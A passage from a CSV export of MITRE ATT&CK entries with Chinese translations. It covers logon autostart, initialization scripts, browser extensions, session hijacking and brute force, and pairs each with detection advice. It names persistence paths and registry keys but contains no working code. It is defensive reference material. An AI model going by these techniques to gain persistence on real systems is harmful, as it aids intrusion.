Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",https://attack.mitre.org/techniques/T1547/004,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation","Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1547,,Praetorian,"Administrator, SYSTEM",,,CAPEC-579,,,"(Citation: Zscaler Bazar September 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Unit42 Cannon Nov 2018),(Citation: Microsoft PLATINUM April 2016),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: ESET Gazer Aug 2017),(Citation: PWC KeyBoys Feb 2017),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Securelist Remexi Jan 2019),(Citation: Windows Commands JPCERT),(Citation: NSA MS AppLocker),(Citation: Beechey 2010)",引导或登录自动启动执行：Winlogon Helper DLL,当用户登录时，攻击者可能会滥用 Winlogon 的功能来执行 DLL 和/或可执行文件。Winlogon.exe 是一个 Windows 组件，负责登录/注销时的操作以及由 Ctrl-Alt-Delete 触发的安全注意序列 (SAS) . <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> 和 <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code 中的注册表项> 用于管理支持 Winlogon 的其他帮助程序和功能。（引用：Cylance Reg Persistence 2013 年 9 月）对这些注册表项的恶意修改可能会导致 Winlogon 加载和执行恶意 DLL 和/或可执行文件。具体来说，已知以下子项可能容易被滥用：（引用：Cylance Reg Persistence Sept 2013） * Winlogon\Notify - 指向处理 Winlogon 事件的通知包 DLL * Winlogon\Userinit - 指向 userinit.exe，用户登录时执行的用户初始化程序 * Winlogon\Shell - 指向 explorer.exe，用户登录时执行的系统 shell 攻击者可能会利用这些功能重复执行恶意代码并建立持久性。
T1547.013,Boot or Logon Autostart Execution: XDG Autostart Entries,"Adversaries may modify XDG autostart entries to execute programs or commands during system boot. Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries. These entries will allow an application to automatically start during the startup of a desktop environment after user logon. By default, XDG autostart entries are stored within the <code>/etc/xdg/autostart</code> or <code>~/.config/autostart</code> directories and have a .desktop file extension.(Citation: Free Desktop Application Autostart Feb 2006)

Within an XDG autostart entry file, the <code>Type</code> key specifies if the entry is an application (type 1), link (type 2) or directory (type 3). The <code>Name</code> key indicates an arbitrary name assigned by the creator and the <code>Exec</code> key indicates the application and command line arguments to execute.(Citation: Free Desktop Entry Keys)

Adversaries may use XDG autostart entries to maintain persistence by executing malicious commands and payloads, such as remote access tools, during the startup of a desktop environment. Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make XDG autostart entries look as if they are associated with legitimate programs.",https://attack.mitre.org/techniques/T1547/013,10 September 2019,10 November 2020,1.0,"Persistence, Privilege Escalation","Malicious XDG autostart entries may be detected by auditing file creation and modification events within the <code>/etc/xdg/autostart</code> and <code>~/.config/autostart</code> directories. Depending on individual configurations, defenders may need to query the environment variables <code>$XDG_CONFIG_HOME</code> or <code>$XDG_CONFIG_DIRS</code> to determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.
 
Suspicious processes or scripts spawned in this manner will have a parent process of the desktop component implementing the XDG specification and will execute as the logged on user.",Linux,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1547,,"Tony Lambert, Red Canary","root, User",,,,,,"(Citation: Red Canary NETWIRE January 2020),(Citation: Fysbis Dr Web Analysis),",引导或登录自动启动执行：XDG 自动启动条目,攻击者可能会修改 XDG 自动启动条目以在系统启动期间执行程序或命令。与 XDG 兼容的 Linux 桌面环境实现了 XDG 自动启动条目的功能。这些条目将允许应用程序在用户登录后启动桌面环境期间自动启动。默认情况下，XDG 自动启动条目存储在 <code>/etc/xdg/autostart</code> 或 <code>~/.config/autostart</code> 目录中，并具有 .desktop 文件扩展名。（引用：免费桌面应用程序自动启动 2006 年 2 月）在 XDG 自动启动条目文件中，<code>Type</code> 键指定条目是应用程序（类型 1）、链接（类型 2）还是目录（类型 3）。 <code>Name</code> 键表示创建者分配的任意名称，<code>Exec</code> 键表示要执行的应用程序和命令行参数。（引用：免费桌面输入键）攻击者可能使用XDG 自动启动条目通过在桌面环境启动期间执行恶意命令和有效负载（例如远程访问工具）来保持持久性。 XDG 自动启动条目中包含的命令在用户登录后在当前登录用户的上下文中执行。攻击者还可以使用 [伪装](https://attack.mitre.org/techniques/T1036) 使 XDG 自动启动条目看起来好像与合法程序相关联。
T1037,Boot or Logon Initialization Scripts,"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  

Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. 

An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",https://attack.mitre.org/techniques/T1037,31 May 2017,01 April 2022,2.1,"Persistence, Privilege Escalation",Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.,"Linux, Windows, macOS","Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation",False,,,,,,,CAPEC-564,,,"(Citation: Anomali Rocke March 2019),",引导或登录初始化脚本,攻击者可以使用在启动或登录初始化时自动执行的脚本来建立持久性。初始化脚本可用于执行管理功能，这些功能通常可以执行其他程序或将信息发送到内部日志服务器。这些脚本可能因操作系统以及本地或远程应用而异。攻击者可以使用这些脚本在单个系统上保持持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。由于某些启动或登录初始化脚本以更高的权限运行，因此攻击者也可以提升他们的权限。
T1037.002,Boot or Logon Initialization Scripts: Login Hook,"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) 

Adversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)

**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) ",https://attack.mitre.org/techniques/T1037/002,10 January 2020,20 April 2022,2.0,"Persistence, Privilege Escalation",Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.,macOS,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1037,,,,,,,,,",",引导或登录初始化脚本：登录钩子,攻击者可以使用登录钩子来建立在用户登录时执行的持久性。登录钩子是一个 plist 文件，它指向特定脚本，以便在用户登录时以 root 权限执行。 plist 文件位于 <code>/Library/Preferences/com.apple.loginwindow.plist</code> 文件中，可以使用 <code>defaults</code> 命令行实用程序进行修改。这种行为对于注销钩子是相同的，在用户注销时可以执行脚本。所有钩子都需要管理员权限才能修改或创建钩子。（引用：Login Scripts Apple Dev）（引用：LoginWindowScripts Apple Dev）攻击者可以在 <code>com.apple.loginwindow.plist</code> 文件中添加或插入恶意脚本的路径，使用 <code>LoginHook</code> 或 <code>LogoutHook</code> 键值对。恶意脚本在下次用户登录时执行。如果登录钩子已经存在，攻击者可以向现有登录钩子添加额外的命令。系统上一次只能有一个登录和注销挂钩。（引用：S1 macOS Persistence）（引用：Wardle Persistence Chapter）**注意：**登录挂钩在 macOS 的 10.11 版本中已弃用，有利于 [Launch守护进程](https://attack.mitre.org/techniques/T1543/004) 和[启动代理](https://attack.mitre.org/techniques/T1543/001)
T1037.001,Boot or Logon Initialization Scripts: Logon Script (Windows),"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)

Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ",https://attack.mitre.org/techniques/T1037/001,10 January 2020,24 March 2020,1.0,"Persistence, Privilege Escalation","Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\Environment\UserInitMprLogonScript</code>.

Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation",True,T1037,,,,,,,,,"(Citation: ESET Attor Oct 2019),(Citation: Unit 42 Playbook Dec 2017),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: ESET Zebrocy Nov 2018),(Citation: Cybereason Kimsuky November 2020),(Citation: Talos Seduploader Oct 2017),(Citation: ESET Sednit Part 1),",引导或登录初始化脚本：登录脚本 (Windows),攻击者可以使用在登录初始化时自动执行的 Windows 登录脚本来建立持久性。 Windows 允许在特定用户或用户组登录系统时运行登录脚本。（引用：TechNet 登录脚本）这是通过将脚本路径添加到 <code>HKCU\Environment\UserInitMprLogonScript</code > 注册表项。（引用：Hexacorn 登录脚本）攻击者可以使用这些脚本在单个系统上保持持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。
T1037.003,Boot or Logon Initialization Scripts: Network Logon Script,"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  
 
Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",https://attack.mitre.org/techniques/T1037/003,10 January 2020,24 March 2020,1.0,"Persistence, Privilege Escalation",Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.,Windows,"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1037,,,,,,,,,",",引导或登录初始化脚本：网络登录脚本,攻击者可以使用在登录初始化时自动执行的网络登录脚本来建立持久性。可以使用 Active Directory 或组策略对象分配网络登录脚本。（引用：Petri 登录脚本 AD）这些登录脚本以分配给它们的用户的权限运行。根据网络中的系统，初始化这些脚本之一可能适用于多个系统或可能适用于所有系统。攻击者可以使用这些脚本来维持网络上的持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。
T1037.004,Boot or Logon Initialization Scripts: RC Scripts,"Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.

Adversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.

Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)

Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",https://attack.mitre.org/techniques/T1037/004,15 January 2020,27 April 2021,2.0,"Persistence, Privilege Escalation","Monitor for unexpected changes to RC scripts in the <code>/etc/</code> directory. Monitor process execution resulting from RC scripts for unusual or unknown applications or behavior.

Monitor for <code>/etc/rc.local</code> file creation. Although types of RC scripts vary for each Unix-like distribution, several execute <code>/etc/rc.local</code> if present. ","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1037,,,root,,,,,,"(Citation: objsee mac malware 2017),(Citation: Intezer HiddenWasp Map 2019),(Citation: NCSC Cyclops Blink February 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),",引导或登录初始化脚本：RC 脚本,攻击者可以通过修改在类 Unix 系统启动期间执行的 RC 脚本来建立持久性。这些文件允许系统管理员在启动时为不同的运行级别映射和启动自定义服务。 RC 脚本需要 root 权限才能修改。攻击者可以通过向 <code>rc.local</code>、<code>rc.common</code> 和其他特定于类 Unix 发行版的 RC 脚本添加恶意二进制路径或 shell 命令来建立持久性。（引文: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) 重新启动后，系统以 root 身份执行脚本的内容，从而导致持久性。对手滥用 RC 脚本对于默认使用 root 用户的轻量级类 Unix 发行版特别有效，例如物联网或嵌入式系统。（引用：intezer-kaiji-malware）一些类 Unix 系统已转移到 Systemd 并弃用了使用RC 脚本。现在这是 macOS 中已弃用的机制，有利于 [Launchd](https://attack.mitre.org/techniques/T1053/004)。 （引用：Apple Developer Doco Archive Launchd）（引用：启动项）该技术可用于仍执行 RC 脚本的 Mac OS X Panther v10.3 及更早版本。（引用：Mac 恶意软件持久性方法）向后维护兼容性 某些系统，例如 Ubuntu，将执行 RC 脚本，如果它们以正确的文件权限存在。（引用：Ubuntu Manpage systemd rc）
T1037.005,Boot or Logon Initialization Scripts: Startup Items,"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)

This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. 

An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",https://attack.mitre.org/techniques/T1037/005,15 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation","The <code>/Library/StartupItems</code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.

Monitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.",macOS,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1037,,,Administrator,,,,,,"(Citation: Kaspersky Adwind Feb 2016),",引导或登录初始化脚本：启动项,攻击者可以使用在启动初始化时自动执行的启动项来建立持久性。启动项在引导过程的最后阶段执行，并包含 shell 脚本或其他可执行文件以及系统使用的配置信息，以确定所有启动项的执行顺序。（引用：启动项）从技术上讲，这是一种已弃用的技术（被 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) 取代，因此不保证相应的文件夹 <code>/Library/StartupItems</code> 存在于默认情况下是系统，但在 macOS Sierra 上似乎默认存在。启动项是一个目录，其可执行和配置属性列表 (plist) <code>StartupParameters.plist</code> 位于顶级目录中。攻击者可以在 StartupItems 目录中创建适当的文件夹/文件来注册他们自己的持久性机制。（引用：Mac Malware Persistence 的方法）此外，由于 StartupItems 在 macOS 的启动阶段运行，它们将以提升的 root 用户身份运行。
T1217,Browser Bookmark Discovery,"Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.

Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.

Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",https://attack.mitre.org/techniques/T1217,18 April 2018,26 March 2020,1.0,Discovery,"Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Process: Process Creation",False,,,Mike Kemmerer,User,,,,,,"(Citation: Threatpost Lizar May 2021),(Citation: NCC Group Chimera January 2021),(Citation: ESET Machete July 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Scarlet Mimic Jan 2016),(Citation: Securelist Calisto July 2018),(Citation: Cybereason PowerLess February 2022),(Citation: Prevailion DarkWatchman 2021),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Github PowerShell Empire),(Citation: BiZone Lizar May 2021),(Citation: Securelist Dtrack),(Citation: CyberBit Dtrack),(Citation: CISA AA20-259A Iran-Based Actor September 2020),",浏览器书签发现,攻击者可能会枚举浏览器书签以了解有关受感染主机的更多信息。浏览器书签可能会显示有关用户的个人信息（例如：银行网站、兴趣、社交媒体等）以及有关内部网络资源（例如服务器、工具/仪表板或其他相关基础设施）的详细信息。在攻击者访问有效凭据后，浏览器书签也可能会突出显示其他目标，尤其是与浏览器缓存的登录相关的 [文件中的凭据](https://attack.mitre.org/techniques/T1552/001)。具体存储位置因平台和/或应用程序而异，但浏览器书签通常存储在本地文件/数据库中。
T1176,Browser Extensions,"Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)

Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.

Previous to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)

Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension)

There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.(Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control.(Citation: Chrome Extension C2 Malware)",https://attack.mitre.org/techniques/T1176,16 January 2018,20 April 2022,1.2,Persistence,"Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.

Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.

On macOS, monitor the command line for usage of the profiles tool, such as <code>profiles install -type=configuration</code>. Additionally, all installed extensions maintain a <code>plist</code> file in the <code>/Library/Managed Preferences/username/</code> directory. Ensure all listed files are in alignment with approved extensions.(Citation: xorrior chrome extensions macOS)","Linux, Windows, macOS","Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Process: Process Creation, Windows Registry: Windows Registry Key Creation",False,,,"Chris Ross @xorrior; Justin Warner, ICEBRG",,,,,,,"(Citation: Netscout Stolen Pencil Dec 2018),(Citation: IBM Grandoreiro April 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Zdnet Kimsuky Dec 2018),(Citation: Malwarebytes Crossrider Apr 2018),(Citation: Intego Shlayer Apr 2018),(Citation: Technospot Chrome Extensions GP)",浏览器扩展,攻击者可能会滥用 Internet 浏览器扩展来建立对受害系统的持久访问。浏览器扩展或插件是可以添加功能和自定义 Internet 浏览器方面的小程序。它们可以直接安装或通过浏览器的应用商店安装，并且通常可以访问和许可浏览器可以访问的所有内容。（引用：维基百科浏览器扩展）（引用：Chrome 扩展定义）恶意扩展可以通过恶意应用安装到浏览器中商店下载伪装成合法扩展，通过社会工程或已经破坏系统的对手。浏览器应用商店的安全性可能受到限制，因此恶意扩展可能不难击败自动扫描程序。（引用：恶意 Chrome 扩展编号）根据浏览器，攻击者还可能操纵扩展的更新 url 以安装来自攻击者控制的更新服务器或操纵移动配置文件以静默安装其他扩展。在 macOS 11 之前，攻击者可以通过命令行静默安装浏览器扩展，使用 <code>profiles</code> 工具安装恶意 <code>.mobileconfig</code> 文件。在 macOS 11+ 中，使用 <code>profiles</code> 工具无法再安装配置配置文件，但是可以通过用户交互植入和安装 <code>.mobileconfig</code> 文件。（引用：xorrior chrome extensions macOS）一旦安装了扩展程序，它就可以在后台浏览网站，窃取用户在浏览器中输入的所有信息（包括凭据），并用作 RAT 的安装程序以实现持久性。（引用：Chrome 扩展程序Crypto Miner）（引用：ICEBRG Chrome Extensions）（引用：Banker Google Chrome Extension Steals Creds）（引用：Catch All Chrome Extension）也有僵尸网络通过恶意 Chrome 扩展使用持久后门的实例。（引用：Stantinko 僵尸网络）也有类似的扩展用于命令和控制的例子。（引用：Chrome 扩展 C2 恶意软件）
T1185,Browser Session Hijacking,"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)

A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.

Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",https://attack.mitre.org/techniques/T1185,16 January 2018,25 February 2022,2.0,Collection,"This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. New processes may not be created and no additional software dropped to disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for [Process Injection](https://attack.mitre.org/techniques/T1055) against browser applications.",Windows,"Logon Session: Logon Session Creation, Process: Process Access, Process: Process Modification",False,,,"Justin Warner, ICEBRG","Administrator, SYSTEM",,,,,,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: IBM Grandoreiro April 2020),(Citation: IBM IcedID November 2017),(Citation: IBM TrickBot Nov 2016),(Citation: Kaspersky QakBot September 2021),(Citation: Trend Micro Trickbot Nov 2018),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: cobaltstrike manual),(Citation: Cybereason Chaes Nov 2020),(Citation: Trusteer Carberp October 2010),(Citation: Prevx Carberp March 2011),(Citation: ESET Grandoreiro April 2020),(Citation: Juniper IcedID June 2020),(Citation: Dell Dridex Oct 2015),(Citation: Fidelis TrickBot Oct 2016),(Citation: Microsoft Totbrick Oct 2017),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Cyberint Qakbot May 2021),",浏览器会话劫持/浏览器中间人,作为各种浏览器会话劫持技术的一部分，攻击者可能会利用浏览器软件中的安全漏洞和固有功能来更改内容、修改用户行为和拦截信息。（引用：浏览器中的维基百科人）一个具体的例子是当攻击者将软件注入浏览器，允许他们继承用户的 cookie、HTTP 会话和 SSL 客户端证书，然后使用浏览器作为转入经过身份验证的 Intranet 的一种方式。（引用：Cobalt Strike Browser Pivot）（引用：ICEBRG Chrome Extensions ) 执行基于浏览器的行为（例如旋转）可能需要特定的进程权限，例如 <code>SeDebugPrivilege</code> 和/或高完整性/管理员权限。另一个示例涉及通过设置将重定向 Web 流量的代理来将来自对手浏览器的浏览器流量转向用户浏览器。这不会以任何方式改变用户的流量，并且可以在关闭浏览器后立即切断代理连接。攻击者假定代理注入的任何浏览器进程的安全上下文。浏览器通常会为每个打开的选项卡创建一个新进程，并相应地分离权限和证书。有了这些权限，攻击者可能会浏览到内部网上的任何资源，例如 [Sharepoint](https://attack.mitre.org/techniques/T1213/002) 或网络邮件，这些资源可以通过浏览器访问，并且浏览器有足够的权限。浏览器旋转也可能绕过 2 因素身份验证提供的安全性。（引用：cobaltstrike 手册）
T1110,Brute Force,"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.",https://attack.mitre.org/techniques/T1110,31 May 2017,19 April 2022,2.4,Credential Access,"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.","Azure AD, Containers, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, User Account: User Account Authentication",False,,,"Alfredo Oliveira, Trend Micro; David Fiser, @anu4is, Trend Micro; Ed Williams, Trustwave, SpiderLabs; Magno Logan, @magnologan, Trend Micro; Mohamed Kmal; Yossi Weizman, Azure Defender Research Team",,,,CAPEC-49,,,"(Citation: Securelist DarkVishnya Dec 2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: SecureWorks August 2019),(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Kroll Qakbot June 2020),(Citation: CME Github September 2018),(Citation: FireEye APT39 Jan 2019),(Citation: Kaspersky Turla),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Chaos Stolen Backdoor),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Lazarus Jun 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: TrendMicro Pawn Storm 2019),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: GitHub PoshC2),(Citation: Aqua Kinsing April 2020),(Citation: CERT-FR PYSA April 2020),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: Microsoft Targeting Elections September 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: NIST 800-63-3)",暴力破解,当密码未知或获得密码哈希时，攻击者可能会使用蛮力技术来访问帐户。在不知道一个帐户或一组帐户的密码的情况下，攻击者可能会使用重复或迭代机制系统地猜测密码。暴力破解密码可以通过与服务进行交互来进行，该服务将检查这些凭据的有效性或离线对照先前获得的凭据数据，例如密码哈希。暴力破解凭证可能会在违规期间的不同点发生。例如，攻击者可能会尝试利用从其他攻击后行为（例如 [OS 凭据转储] (https://attack.mitre.org/techniques/T1003)、[帐户发现](https://attack.mitre.org/techniques/T1087) 或 [密码策略发现](https://attack.mitre .org/techniques/T1201）。作为初始访问的一部分，攻击者还可以将暴力破解活动与 [外部远程服务](https://attack.mitre.org/techniques/T1133) 等行为结合起来。
